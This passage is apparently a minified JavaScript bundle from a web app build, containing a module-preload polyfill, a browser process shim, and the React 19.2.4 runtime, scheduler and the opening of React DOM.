var __defProp = Object.defineProperty;
var __defNormalProp = (obj, key, value) => key in obj ? __defProp(obj, key, { enumerable: true, configurable: true, writable: true, value }) : obj[key] = value;
var __publicField = (obj, key, value) => __defNormalProp(obj, typeof key !== "symbol" ? key + "" : key, value);
(async () => {
  (function() {
    const f = document.createElement("link").relList;
    if (f && f.supports && f.supports("modulepreload")) return;
    for (const E of document.querySelectorAll('link[rel="modulepreload"]')) c(E);
    new MutationObserver((E) => {
      for (const b of E) if (b.type === "childList") for (const p of b.addedNodes) p.tagName === "LINK" && p.rel === "modulepreload" && c(p);
    }).observe(document, {
      childList: true,
      subtree: true
    });
    function r(E) {
      const b = {};
      return E.integrity && (b.integrity = E.integrity), E.referrerPolicy && (b.referrerPolicy = E.referrerPolicy), E.crossOrigin === "use-credentials" ? b.credentials = "include" : E.crossOrigin === "anonymous" ? b.credentials = "omit" : b.credentials = "same-origin", b;
    }
    function c(E) {
      if (E.ep) return;
      E.ep = true;
      const b = r(E);
      fetch(E.href, b);
    }
  })();
  var Kr = {
    exports: {}
  }, Ga = {};
  var Ah;
  function Am() {
    if (Ah) return Ga;
    Ah = 1;
    var u = /* @__PURE__ */ Symbol.for("react.transitional.element"), f = /* @__PURE__ */ Symbol.for("react.fragment");
    function r(c, E, b) {
      var p = null;
      if (b !== void 0 && (p = "" + b), E.key !== void 0 && (p = "" + E.key), "key" in E) {
        b = {};
        for (var x in E) x !== "key" && (b[x] = E[x]);
      } else b = E;
      return E = b.ref, {
        $$typeof: u,
        type: c,
        key: p,
        ref: E !== void 0 ? E : null,
        props: b
      };
    }
    return Ga.Fragment = f, Ga.jsx = r, Ga.jsxs = r, Ga;
  }
  var Th;
  function Tm() {
    return Th || (Th = 1, Kr.exports = Am()), Kr.exports;
  }
  var Xt = Tm(), Qr = {
    exports: {}
  };
  function Sm(u) {
    return u && u.__esModule && Object.prototype.hasOwnProperty.call(u, "default") ? u.default : u;
  }
  var id = {
    exports: {}
  }, Jt = id.exports = {}, hn, dn;
  function u0() {
    throw new Error("setTimeout has not been defined");
  }
  function a0() {
    throw new Error("clearTimeout has not been defined");
  }
  (function() {
    try {
      typeof setTimeout == "function" ? hn = setTimeout : hn = u0;
    } catch {
      hn = u0;
    }
    try {
      typeof clearTimeout == "function" ? dn = clearTimeout : dn = a0;
    } catch {
      dn = a0;
    }
  })();
  function fd(u) {
    if (hn === setTimeout) return setTimeout(u, 0);
    if ((hn === u0 || !hn) && setTimeout) return hn = setTimeout, setTimeout(u, 0);
    try {
      return hn(u, 0);
    } catch {
      try {
        return hn.call(null, u, 0);
      } catch {
        return hn.call(this, u, 0);
      }
    }
  }
  function Um(u) {
    if (dn === clearTimeout) return clearTimeout(u);
    if ((dn === a0 || !dn) && clearTimeout) return dn = clearTimeout, clearTimeout(u);
    try {
      return dn(u);
    } catch {
      try {
        return dn.call(null, u);
      } catch {
        return dn.call(this, u);
      }
    }
  }
  var qn = [], Gu = false, Il, gf = -1;
  function xm() {
    !Gu || !Il || (Gu = false, Il.length ? qn = Il.concat(qn) : gf = -1, qn.length && cd());
  }
  function cd() {
    if (!Gu) {
      var u = fd(xm);
      Gu = true;
      for (var f = qn.length; f; ) {
        for (Il = qn, qn = []; ++gf < f; ) Il && Il[gf].run();
        gf = -1, f = qn.length;
      }
      Il = null, Gu = false, Um(u);
    }
  }
  Jt.nextTick = function(u) {
    var f = new Array(arguments.length - 1);
    if (arguments.length > 1) for (var r = 1; r < arguments.length; r++) f[r - 1] = arguments[r];
    qn.push(new rd(u, f)), qn.length === 1 && !Gu && fd(cd);
  };
  function rd(u, f) {
    this.fun = u, this.array = f;
  }
  rd.prototype.run = function() {
    this.fun.apply(null, this.array);
  };
  Jt.title = "browser";
  Jt.browser = true;
  Jt.env = {};
  Jt.argv = [];
  Jt.version = "";
  Jt.versions = {};
  function jn() {
  }
  Jt.on = jn;
  Jt.addListener = jn;
  Jt.once = jn;
  Jt.off = jn;
  Jt.removeListener = jn;
  Jt.removeAllListeners = jn;
  Jt.emit = jn;
  Jt.prependListener = jn;
  Jt.prependOnceListener = jn;
  Jt.listeners = function(u) {
    return [];
  };
  Jt.binding = function(u) {
    throw new Error("process.binding is not supported");
  };
  Jt.cwd = function() {
    return "/";
  };
  Jt.chdir = function(u) {
    throw new Error("process.chdir is not supported");
  };
  Jt.umask = function() {
    return 0;
  };
  var Om = id.exports;
  const qu = Sm(Om);
  var tt = {}, Sh;
  function Nm() {
    if (Sh) return tt;
    Sh = 1;
    var u = /* @__PURE__ */ Symbol.for("react.transitional.element"), f = /* @__PURE__ */ Symbol.for("react.portal"), r = /* @__PURE__ */ Symbol.for("react.fragment"), c = /* @__PURE__ */ Symbol.for("react.strict_mode"), E = /* @__PURE__ */ Symbol.for("react.profiler"), b = /* @__PURE__ */ Symbol.for("react.consumer"), p = /* @__PURE__ */ Symbol.for("react.context"), x = /* @__PURE__ */ Symbol.for("react.forward_ref"), A = /* @__PURE__ */ Symbol.for("react.suspense"), v = /* @__PURE__ */ Symbol.for("react.memo"), m = /* @__PURE__ */ Symbol.for("react.lazy"), B = /* @__PURE__ */ Symbol.for("react.activity"), q = Symbol.iterator;
    function X(U) {
      return U === null || typeof U != "object" ? null : (U = q && U[q] || U["@@iterator"], typeof U == "function" ? U : null);
    }
    var k = {
      isMounted: function() {
        return false;
      },
      enqueueForceUpdate: function() {
      },
      enqueueReplaceState: function() {
      },
      enqueueSetState: function() {
      }
    }, V = Object.assign, nt = {};
    function it(U, G, Q) {
      this.props = U, this.context = G, this.refs = nt, this.updater = Q || k;
    }
    it.prototype.isReactComponent = {}, it.prototype.setState = function(U, G) {
      if (typeof U != "object" && typeof U != "function" && U != null) throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
      this.updater.enqueueSetState(this, U, G, "setState");
    }, it.prototype.forceUpdate = function(U) {
      this.updater.enqueueForceUpdate(this, U, "forceUpdate");
    };
    function mt() {
    }
    mt.prototype = it.prototype;
    function lt(U, G, Q) {
      this.props = U, this.context = G, this.refs = nt, this.updater = Q || k;
    }
    var ut = lt.prototype = new mt();
    ut.constructor = lt, V(ut, it.prototype), ut.isPureReactComponent = true;
    var ot = Array.isArray;
    function Bt() {
    }
    var ft = {
      H: null,
      A: null,
      T: null,
      S: null
    }, zt = Object.prototype.hasOwnProperty;
    function he(U, G, Q) {
      var j = Q.ref;
      return {
        $$typeof: u,
        type: U,
        key: G,
        ref: j !== void 0 ? j : null,
        props: Q
      };
    }
    function Te(U, G) {
      return he(U.type, G, U.props);
    }
    function Ce(U) {
      return typeof U == "object" && U !== null && U.$$typeof === u;
    }
    function de(U) {
      var G = {
        "=": "=0",
        ":": "=2"
      };
      return "$" + U.replace(/[=:]/g, function(Q) {
        return G[Q];
      });
    }
    var pn = /\/+/g;
    function We(U, G) {
      return typeof U == "object" && U !== null && U.key != null ? de("" + U.key) : G.toString(36);
    }
    function Se(U) {
      switch (U.status) {
        case "fulfilled":
          return U.value;
        case "rejected":
          throw U.reason;
        default:
          switch (typeof U.status == "string" ? U.then(Bt, Bt) : (U.status = "pending", U.then(function(G) {
            U.status === "pending" && (U.status = "fulfilled", U.value = G);
          }, function(G) {
            U.status === "pending" && (U.status = "rejected", U.reason = G);
          })), U.status) {
            case "fulfilled":
              return U.value;
            case "rejected":
              throw U.reason;
          }
      }
      throw U;
    }
    function H(U, G, Q, j, J) {
      var ct = typeof U;
      (ct === "undefined" || ct === "boolean") && (U = null);
      var pt = false;
      if (U === null) pt = true;
      else switch (ct) {
        case "bigint":
        case "string":
        case "number":
          pt = true;
          break;
        case "object":
          switch (U.$$typeof) {
            case u:
            case f:
              pt = true;
              break;
            case m:
              return pt = U._init, H(pt(U._payload), G, Q, j, J);
          }
      }
      if (pt) return J = J(U), pt = j === "" ? "." + We(U, 0) : j, ot(J) ? (Q = "", pt != null && (Q = pt.replace(pn, "$&/") + "/"), H(J, G, Q, "", function(Kn) {
        return Kn;
      })) : J != null && (Ce(J) && (J = Te(J, Q + (J.key == null || U && U.key === J.key ? "" : ("" + J.key).replace(pn, "$&/") + "/") + pt)), G.push(J)), 1;
      pt = 0;
      var ee = j === "" ? "." : j + ":";
      if (ot(U)) for (var Gt = 0; Gt < U.length; Gt++) j = U[Gt], ct = ee + We(j, Gt), pt += H(j, G, Q, ct, J);
      else if (Gt = X(U), typeof Gt == "function") for (U = Gt.call(U), Gt = 0; !(j = U.next()).done; ) j = j.value, ct = ee + We(j, Gt++), pt += H(j, G, Q, ct, J);
      else if (ct === "object") {
        if (typeof U.then == "function") return H(Se(U), G, Q, j, J);
        throw G = String(U), Error("Objects are not valid as a React child (found: " + (G === "[object Object]" ? "object with keys {" + Object.keys(U).join(", ") + "}" : G) + "). If you meant to render a collection of children, use an array instead.");
      }
      return pt;
    }
    function K(U, G, Q) {
      if (U == null) return U;
      var j = [], J = 0;
      return H(U, j, "", "", function(ct) {
        return G.call(Q, ct, J++);
      }), j;
    }
    function P(U) {
      if (U._status === -1) {
        var G = U._result;
        G = G(), G.then(function(Q) {
          (U._status === 0 || U._status === -1) && (U._status = 1, U._result = Q);
        }, function(Q) {
          (U._status === 0 || U._status === -1) && (U._status = 2, U._result = Q);
        }), U._status === -1 && (U._status = 0, U._result = G);
      }
      if (U._status === 1) return U._result.default;
      throw U._result;
    }
    var St = typeof reportError == "function" ? reportError : function(U) {
      if (typeof window == "object" && typeof window.ErrorEvent == "function") {
        var G = new window.ErrorEvent("error", {
          bubbles: true,
          cancelable: true,
          message: typeof U == "object" && U !== null && typeof U.message == "string" ? String(U.message) : String(U),
          error: U
        });
        if (!window.dispatchEvent(G)) return;
      } else if (typeof qu == "object" && typeof qu.emit == "function") {
        qu.emit("uncaughtException", U);
        return;
      }
      console.error(U);
    }, Ut = {
      map: K,
      forEach: function(U, G, Q) {
        K(U, function() {
          G.apply(this, arguments);
        }, Q);
      },
      count: function(U) {
        var G = 0;
        return K(U, function() {
          G++;
        }), G;
      },
      toArray: function(U) {
        return K(U, function(G) {
          return G;
        }) || [];
      },
      only: function(U) {
        if (!Ce(U)) throw Error("React.Children.only expected to receive a single React element child.");
        return U;
      }
    };
    return tt.Activity = B, tt.Children = Ut, tt.Component = it, tt.Fragment = r, tt.Profiler = E, tt.PureComponent = lt, tt.StrictMode = c, tt.Suspense = A, tt.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = ft, tt.__COMPILER_RUNTIME = {
      __proto__: null,
      c: function(U) {
        return ft.H.useMemoCache(U);
      }
    }, tt.cache = function(U) {
      return function() {
        return U.apply(null, arguments);
      };
    }, tt.cacheSignal = function() {
      return null;
    }, tt.cloneElement = function(U, G, Q) {
      if (U == null) throw Error("The argument must be a React element, but you passed " + U + ".");
      var j = V({}, U.props), J = U.key;
      if (G != null) for (ct in G.key !== void 0 && (J = "" + G.key), G) !zt.call(G, ct) || ct === "key" || ct === "__self" || ct === "__source" || ct === "ref" && G.ref === void 0 || (j[ct] = G[ct]);
      var ct = arguments.length - 2;
      if (ct === 1) j.children = Q;
      else if (1 < ct) {
        for (var pt = Array(ct), ee = 0; ee < ct; ee++) pt[ee] = arguments[ee + 2];
        j.children = pt;
      }
      return he(U.type, J, j);
    }, tt.createContext = function(U) {
      return U = {
        $$typeof: p,
        _currentValue: U,
        _currentValue2: U,
        _threadCount: 0,
        Provider: null,
        Consumer: null
      }, U.Provider = U, U.Consumer = {
        $$typeof: b,
        _context: U
      }, U;
    }, tt.createElement = function(U, G, Q) {
      var j, J = {}, ct = null;
      if (G != null) for (j in G.key !== void 0 && (ct = "" + G.key), G) zt.call(G, j) && j !== "key" && j !== "__self" && j !== "__source" && (J[j] = G[j]);
      var pt = arguments.length - 2;
      if (pt === 1) J.children = Q;
      else if (1 < pt) {
        for (var ee = Array(pt), Gt = 0; Gt < pt; Gt++) ee[Gt] = arguments[Gt + 2];
        J.children = ee;
      }
      if (U && U.defaultProps) for (j in pt = U.defaultProps, pt) J[j] === void 0 && (J[j] = pt[j]);
      return he(U, ct, J);
    }, tt.createRef = function() {
      return {
        current: null
      };
    }, tt.forwardRef = function(U) {
      return {
        $$typeof: x,
        render: U
      };
    }, tt.isValidElement = Ce, tt.lazy = function(U) {
      return {
        $$typeof: m,
        _payload: {
          _status: -1,
          _result: U
        },
        _init: P
      };
    }, tt.memo = function(U, G) {
      return {
        $$typeof: v,
        type: U,
        compare: G === void 0 ? null : G
      };
    }, tt.startTransition = function(U) {
      var G = ft.T, Q = {};
      ft.T = Q;
      try {
        var j = U(), J = ft.S;
        J !== null && J(Q, j), typeof j == "object" && j !== null && typeof j.then == "function" && j.then(Bt, St);
      } catch (ct) {
        St(ct);
      } finally {
        G !== null && Q.types !== null && (G.types = Q.types), ft.T = G;
      }
    }, tt.unstable_useCacheRefresh = function() {
      return ft.H.useCacheRefresh();
    }, tt.use = function(U) {
      return ft.H.use(U);
    }, tt.useActionState = function(U, G, Q) {
      return ft.H.useActionState(U, G, Q);
    }, tt.useCallback = function(U, G) {
      return ft.H.useCallback(U, G);
    }, tt.useContext = function(U) {
      return ft.H.useContext(U);
    }, tt.useDebugValue = function() {
    }, tt.useDeferredValue = function(U, G) {
      return ft.H.useDeferredValue(U, G);
    }, tt.useEffect = function(U, G) {
      return ft.H.useEffect(U, G);
    }, tt.useEffectEvent = function(U) {
      return ft.H.useEffectEvent(U);
    }, tt.useId = function() {
      return ft.H.useId();
    }, tt.useImperativeHandle = function(U, G, Q) {
      return ft.H.useImperativeHandle(U, G, Q);
    }, tt.useInsertionEffect = function(U, G) {
      return ft.H.useInsertionEffect(U, G);
    }, tt.useLayoutEffect = function(U, G) {
      return ft.H.useLayoutEffect(U, G);
    }, tt.useMemo = function(U, G) {
      return ft.H.useMemo(U, G);
    }, tt.useOptimistic = function(U, G) {
      return ft.H.useOptimistic(U, G);
    }, tt.useReducer = function(U, G, Q) {
      return ft.H.useReducer(U, G, Q);
    }, tt.useRef = function(U) {
      return ft.H.useRef(U);
    }, tt.useState = function(U) {
      return ft.H.useState(U);
    }, tt.useSyncExternalStore = function(U, G, Q) {
      return ft.H.useSyncExternalStore(U, G, Q);
    }, tt.useTransition = function() {
      return ft.H.useTransition();
    }, tt.version = "19.2.4", tt;
  }
  var Uh;
  function h0() {
    return Uh || (Uh = 1, Qr.exports = Nm()), Qr.exports;
  }
  var ja = h0(), Vr = {
    exports: {}
  }, qa = {}, Zr = {
    exports: {}
  }, Ir = {};
  var xh;
  function Rm() {
    return xh || (xh = 1, (function(u) {
      function f(H, K) {
        var P = H.length;
        H.push(K);
        t: for (; 0 < P; ) {
          var St = P - 1 >>> 1, Ut = H[St];
          if (0 < E(Ut, K)) H[St] = K, H[P] = Ut, P = St;
          else break t;
        }
      }
      function r(H) {
        return H.length === 0 ? null : H[0];
      }
      function c(H) {
        if (H.length === 0) return null;
        var K = H[0], P = H.pop();
        if (P !== K) {
          H[0] = P;
          t: for (var St = 0, Ut = H.length, U = Ut >>> 1; St < U; ) {
            var G = 2 * (St + 1) - 1, Q = H[G], j = G + 1, J = H[j];
            if (0 > E(Q, P)) j < Ut && 0 > E(J, Q) ? (H[St] = J, H[j] = P, St = j) : (H[St] = Q, H[G] = P, St = G);
            else if (j < Ut && 0 > E(J, P)) H[St] = J, H[j] = P, St = j;
            else break t;
          }
        }
        return K;
      }
      function E(H, K) {
        var P = H.sortIndex - K.sortIndex;
        return P !== 0 ? P : H.id - K.id;
      }
      if (u.unstable_now = void 0, typeof performance == "object" && typeof performance.now == "function") {
        var b = performance;
        u.unstable_now = function() {
          return b.now();
        };
      } else {
        var p = Date, x = p.now();
        u.unstable_now = function() {
          return p.now() - x;
        };
      }
      var A = [], v = [], m = 1, B = null, q = 3, X = false, k = false, V = false, nt = false, it = typeof setTimeout == "function" ? setTimeout : null, mt = typeof clearTimeout == "function" ? clearTimeout : null, lt = typeof setImmediate < "u" ? setImmediate : null;
      function ut(H) {
        for (var K = r(v); K !== null; ) {
          if (K.callback === null) c(v);
          else if (K.startTime <= H) c(v), K.sortIndex = K.expirationTime, f(A, K);
          else break;
          K = r(v);
        }
      }
      function ot(H) {
        if (V = false, ut(H), !k) if (r(A) !== null) k = true, Bt || (Bt = true, de());
        else {
          var K = r(v);
          K !== null && Se(ot, K.startTime - H);
        }
      }
      var Bt = false, ft = -1, zt = 5, he = -1;
      function Te() {
        return nt ? true : !(u.unstable_now() - he < zt);
      }
      function Ce() {
        if (nt = false, Bt) {
          var H = u.unstable_now();
          he = H;
          var K = true;
          try {
            t: {
              k = false, V && (V = false, mt(ft), ft = -1), X = true;
              var P = q;
              try {
                e: {
                  for (ut(H), B = r(A); B !== null && !(B.expirationTime > H && Te()); ) {
                    var St = B.callback;
                    if (typeof St == "function") {
                      B.callback = null, q = B.priorityLevel;
                      var Ut = St(B.expirationTime <= H);
                      if (H = u.unstable_now(), typeof Ut == "function") {
                        B.callback = Ut, ut(H), K = true;
                        break e;
                      }
                      B === r(A) && c(A), ut(H);
                    } else c(A);
                    B = r(A);
                  }
                  if (B !== null) K = true;
                  else {
                    var U = r(v);
                    U !== null && Se(ot, U.startTime - H), K = false;
                  }
                }
                break t;
              } finally {
                B = null, q = P, X = false;
              }
              K = void 0;
            }
          } finally {
            K ? de() : Bt = false;
          }
        }
      }
      var de;
      if (typeof lt == "function") de = function() {
        lt(Ce);
      };
      else if (typeof MessageChannel < "u") {
        var pn = new MessageChannel(), We = pn.port2;
        pn.port1.onmessage = Ce, de = function() {
          We.postMessage(null);
        };
      } else de = function() {
        it(Ce, 0);
      };
      function Se(H, K) {
        ft = it(function() {
          H(u.unstable_now());
        }, K);
      }
      u.unstable_IdlePriority = 5, u.unstable_ImmediatePriority = 1, u.unstable_LowPriority = 4, u.unstable_NormalPriority = 3, u.unstable_Profiling = null, u.unstable_UserBlockingPriority = 2, u.unstable_cancelCallback = function(H) {
        H.callback = null;
      }, u.unstable_forceFrameRate = function(H) {
        0 > H || 125 < H ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : zt = 0 < H ? Math.floor(1e3 / H) : 5;
      }, u.unstable_getCurrentPriorityLevel = function() {
        return q;
      }, u.unstable_next = function(H) {
        switch (q) {
          case 1:
          case 2:
          case 3:
            var K = 3;
            break;
          default:
            K = q;
        }
        var P = q;
        q = K;
        try {
          return H();
        } finally {
          q = P;
        }
      }, u.unstable_requestPaint = function() {
        nt = true;
      }, u.unstable_runWithPriority = function(H, K) {
        switch (H) {
          case 1:
          case 2:
          case 3:
          case 4:
          case 5:
            break;
          default:
            H = 3;
        }
        var P = q;
        q = H;
        try {
          return K();
        } finally {
          q = P;
        }
      }, u.unstable_scheduleCallback = function(H, K, P) {
        var St = u.unstable_now();
        switch (typeof P == "object" && P !== null ? (P = P.delay, P = typeof P == "number" && 0 < P ? St + P : St) : P = St, H) {
          case 1:
            var Ut = -1;
            break;
          case 2:
            Ut = 250;
            break;
          case 5:
            Ut = 1073741823;
            break;
          case 4:
            Ut = 1e4;
            break;
          default:
            Ut = 5e3;
        }
        return Ut = P + Ut, H = {
          id: m++,
          callback: K,
          priorityLevel: H,
          startTime: P,
          expirationTime: Ut,
          sortIndex: -1
        }, P > St ? (H.sortIndex = P, f(v, H), r(A) === null && H === r(v) && (V ? (mt(ft), ft = -1) : V = true, Se(ot, P - St))) : (H.sortIndex = Ut, f(A, H), k || X || (k = true, Bt || (Bt = true, de()))), H;
      }, u.unstable_shouldYield = Te, u.unstable_wrapCallback = function(H) {
        var K = q;
        return function() {
          var P = q;
          q = K;
          try {
            return H.apply(this, arguments);
          } finally {
            q = P;
          }
        };
      };
    })(Ir)), Ir;
  }
  var Oh;
  function Dm() {
    return Oh || (Oh = 1, Zr.exports = Rm()), Zr.exports;
  }
  var Jr = {
    exports: {}
  }, ye = {};
  var Nh;
  function Bm() {
    if (Nh) return ye;
    Nh = 1;
    var u = h0();
    function f(A) {
      var v = "https://react.dev/errors/" + A;
      if (1 < arguments.length) {
        v += "?args[]=" + encodeURIComponent(arguments[1]);
        for (var m = 2; m < arguments.length; m++) v += "&args[]=" + encodeURIComponent(arguments[m]);
      }
      return "Minified React error #" + A + "; visit " + v + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
    }
    function r() {
    }
    var c = {
      d: {
        f: r,
        r: function() {
          throw Error(f(522));
        },
        D: r,
        C: r,
        L: r,
        m: r,
        X: r,
        S: r,
        M: r
      },
      p: 0,
      findDOMNode: null
    }, E = /* @__PURE__ */ Symbol.for("react.portal");
    function b(A, v, m) {
      var B = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
      return {
        $$typeof: E,
        key: B == null ? null : "" + B,
        children: A,
        containerInfo: v,
        implementation: m
      };
    }
    var p = u.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
    function x(A, v) {
      if (A === "font") return "";
      if (typeof v == "string") return v === "use-credentials" ? v : "";
    }
    return ye.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = c, ye.createPortal = function(A, v) {
      var m = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
      if (!v || v.nodeType !== 1 && v.nodeType !== 9 && v.nodeType !== 11) throw Error(f(299));
      return b(A, v, null, m);
    }, ye.flushSync = function(A) {
      var v = p.T, m = c.p;
      try {
        if (p.T = null, c.p = 2, A) return A();
      } finally {
        p.T = v, c.p = m, c.d.f();
      }
    }, ye.preconnect = function(A, v) {
      typeof A == "string" && (v ? (v = v.crossOrigin, v = typeof v == "string" ? v === "use-credentials" ? v : "" : void 0) : v = null, c.d.C(A, v));
    }, ye.prefetchDNS = function(A) {
      typeof A == "string" && c.d.D(A);
    }, ye.preinit = function(A, v) {
      if (typeof A == "string" && v && typeof v.as == "string") {
        var m = v.as, B = x(m, v.crossOrigin), q = typeof v.integrity == "string" ? v.integrity : void 0, X = typeof v.fetchPriority == "string" ? v.fetchPriority : void 0;
        m === "style" ? c.d.S(A, typeof v.precedence == "string" ? v.precedence : void 0, {
          crossOrigin: B,
          integrity: q,
          fetchPriority: X
        }) : m === "script" && c.d.X(A, {
          crossOrigin: B,
          integrity: q,
          fetchPriority: X,
          nonce: typeof v.nonce == "string" ? v.nonce : void 0
        });
      }
    }, ye.preinitModule = function(A, v) {
      if (typeof A == "string") if (typeof v == "object" && v !== null) {
        if (v.as == null || v.as === "script") {
          var m = x(v.as, v.crossOrigin);
          c.d.M(A, {
            crossOrigin: m,
            integrity: typeof v.integrity == "string" ? v.integrity : void 0,
            nonce: typeof v.nonce == "string" ? v.nonce : void 0
          });
        }
      } else v == null && c.d.M(A);
    }, ye.preload = function(A, v) {
      if (typeof A == "string" && typeof v == "object" && v !== null && typeof v.as == "string") {
        var m = v.as, B = x(m, v.crossOrigin);
        c.d.L(A, m, {
          crossOrigin: B,
          integrity: typeof v.integrity == "string" ? v.integrity : void 0,
          nonce: typeof v.nonce == "string" ? v.nonce : void 0,
          type: typeof v.type == "string" ? v.type : void 0,
          fetchPriority: typeof v.fetchPriority == "string" ? v.fetchPriority : void 0,
          referrerPolicy: typeof v.referrerPolicy == "string" ? v.referrerPolicy : void 0,
          imageSrcSet: typeof v.imageSrcSet == "string" ? v.imageSrcSet : void 0,
          imageSizes: typeof v.imageSizes == "string" ? v.imageSizes : void 0,
          media: typeof v.media == "string" ? v.media : void 0
        });
      }
    }, ye.preloadModule = function(A, v) {
      if (typeof A == "string") if (v) {
        var m = x(v.as, v.crossOrigin);
        c.d.m(A, {
          as: typeof v.as == "string" && v.as !== "script" ? v.as : void 0,
          crossOrigin: m,
          integrity: typeof v.integrity == "string" ? v.integrity : void 0
        });
      } else c.d.m(A);
    }, ye.requestFormReset = function(A) {
      c.d.r(A);
    }, ye.unstable_batchedUpdates = function(A, v) {
      return A(v);
    }, ye.useFormState = function(A, v, m) {
      return p.H.useFormState(A, v, m);
    }, ye.useFormStatus = function() {
      return p.H.useHostTransitionStatus();
    }, ye.version = "19.2.4", ye;
  }
  var Rh;
  function zm() {
    if (Rh) return Jr.exports;
    Rh = 1;
    function u() {
      if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(u);
      } catch (f) {
        console.error(f);
      }
    }
    return u(), Jr.exports = Bm(), Jr.exports;
  }
  var Dh;
  function Mm() {
    if (Dh) return qa;
    Dh = 1;
    var u = Dm(), f = h0(), r = zm();
    function c(t) {
      var e = "https://react.dev/errors/" + t;
      if (1 < arguments.length) {
        e += "?args[]=" + encodeURIComponent(arguments[1]);
        for (var n = 2; n < arguments.length; n++) e += "&args[]=" + encodeURIComponent(arguments[n]);
      }
      return "Minified React error #" + t + "; visit " + e + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
    }
    function E(t) {
      return !(!t || t.nodeType !== 1 && t.nodeType !== 9 && t.nodeType !== 11);
    }
    function b(t) {
      var e = t, n = t;
      if (t.alternate) for (; e.return; ) e = e.return;
      else {
        t = e;
        do
          e = t, (e.flags & 4098) !== 0 && (n = e.return), t = e.return;
        while (t);
      }
      return e.tag === 3 ? n : null;
    }
    function p(t) {
      if (t.tag === 13) {
        var e = t.memoizedState;
        if (e === null && (t = t.alternate, t !== null && (e = t.memoizedState)), e !== null) return e.dehydrated;
      }
      return null;
    }
    function x(t) {
      if (t.tag === 31) {
        var e = t.memoizedState;
        if (e === null && (t = t.alternate, t !== null && (e = t.memoizedState)), e !== null) return e.dehydrated;
      }
      return null;
    }
    function A(t) {
      if (b(t) !== t) throw Error(c(188));
    }
    function v(t) {
      var e = t.alternate;
      if (!e) {
        if (e = b(t), e === null) throw Error(c(188));
        return e !== t ? null : t;
      }
      for (var n = t, l = e; ; ) {
        var a = n.return;
        if (a === null) break;
        var i = a.alternate;
        if (i === null) {
          if (l = a.return, l !== null) {
            n = l;
            continue;
          }
          break;
        }
        if (a.child === i.child) {
          for (i = a.child; i; ) {
            if (i === n) return A(a), t;
            if (i === l) return A(a), e;
            i = i.sibling;
          }
          throw Error(c(188));
        }
        if (n.return !== l.return) n = a, l = i;
        else {
          for (var h = false, d = a.child; d; ) {
            if (d === n) {
              h = true, n = a, l = i;
              break;
            }
            if (d === l) {
              h = true, l = a, n = i;
              break;
            }
            d = d.sibling;
          }
          if (!h) {
            for (d = i.child; d; ) {
              if (d === n) {
                h = true, n = i, l = a;
                break;
              }
              if (d === l) {
                h = true, l = i, n = a;
                break;
              }
              d = d.sibling;
            }
            if (!h) throw Error(c(189));
          }
        }
        if (n.alternate !== l) throw Error(c(190));
      }
      if (n.tag !== 3) throw Error(c(188));
      return n.stateNode.current === n ? t : e;
    }
    function m(t) {
      var e = t.tag;
      if (e === 5 || e === 26 || e === 27 || e === 6) return t;
      for (t = t.child; t !== null; ) {
        if (e = m(t), e !== null) return e;
        t = t.sibling;
      }
      return null;
    }
    var B = Object.assign, q = /* @__PURE__ */ Symbol.for("react.element"), X = /* @__PURE__ */ Symbol.for("react.transitional.element"), k = /* @__PURE__ */ Symbol.for("react.portal"), V = /* @__PURE__ */ Symbol.for("react.fragment"), nt = /* @__PURE__ */ Symbol.for("react.strict_mode"), it = /* @__PURE__ */ Symbol.for("react.profiler"), mt = /* @__PURE__ */ Symbol.for("react.consumer"), lt = /* @__PURE__ */ Symbol.for("react.context"), ut = /* @__PURE__ */ Symbol.for("react.forward_ref"), ot = /* @__PURE__ */ Symbol.for("react.suspense"), Bt = /* @__PURE__ */ Symbol.for("react.suspense_list"), ft = /* @__PURE__ */ Symbol.for("react.memo"), zt = /* @__PURE__ */ Symbol.for("react.lazy"), he = /* @__PURE__ */ Symbol.for("react.activity"), Te = /* @__PURE__ */ Symbol.for("react.memo_cache_sentinel"), Ce = Symbol.iterator;
    function de(t) {
      return t === null || typeof t != "object" ? null : (t = Ce && t[Ce] || t["@@iterator"], typeof t == "function" ? t : null);
    }
    var pn = /* @__PURE__ */ Symbol.for("react.client.reference");
    function We(t) {
      if (t == null) return null;
      if (typeof t == "function") return t.$$typeof === pn ? null : t.displayName || t.name || null;
      if (typeof t == "string") return t;
      switch (t) {
        case V:
          return "Fragment";
        case it:
          return "Profiler";
        case nt:
          return "StrictMode";
        case ot:
          return "Suspense";
        case Bt:
          return "SuspenseList";
        case he:
          return "Activity";
      }
      if (typeof t == "object") switch (t.$$typeof) {
        case k:
          return "Portal";
        case lt:
          return t.displayName || "Context";
        case mt:
          return (t._context.displayName || "Context") + ".Consumer";
        case ut:
          var e = t.render;
          return t = t.displayName, t || (t = e.displayName || e.name || "", t = t !== "" ? "ForwardRef(" + t + ")" : "ForwardRef"), t;
        case ft:
          return e = t.displayName || null, e !== null ? e : We(t.type) || "Memo";
        case zt:
          e = t._payload, t = t._init;
          try {
            return We(t(e));
          } catch {
          }
      }
      return null;
    }
    var Se = Array.isArray, H = f.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE, K = r.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE, P = {
      pending: false,
      data: null,
      method: null,
      action: null
    }, St = [], Ut = -1;
    function U(t) {
      return {
        current: t
      };
    }
    function G(t) {
      0 > Ut || (t.current = St[Ut], St[Ut] = null, Ut--);
    }
    function Q(t, e) {
      Ut++, St[Ut] = t.current, t.current = e;
    }
    var j = U(null), J = U(null), ct = U(null), pt = U(null);
    function ee(t, e) {
      switch (Q(ct, e), Q(J, t), Q(j, null), e.nodeType) {
        case 9:
        case 11:
          t = (t = e.documentElement) && (t = t.namespaceURI) ? V1(t) : 0;
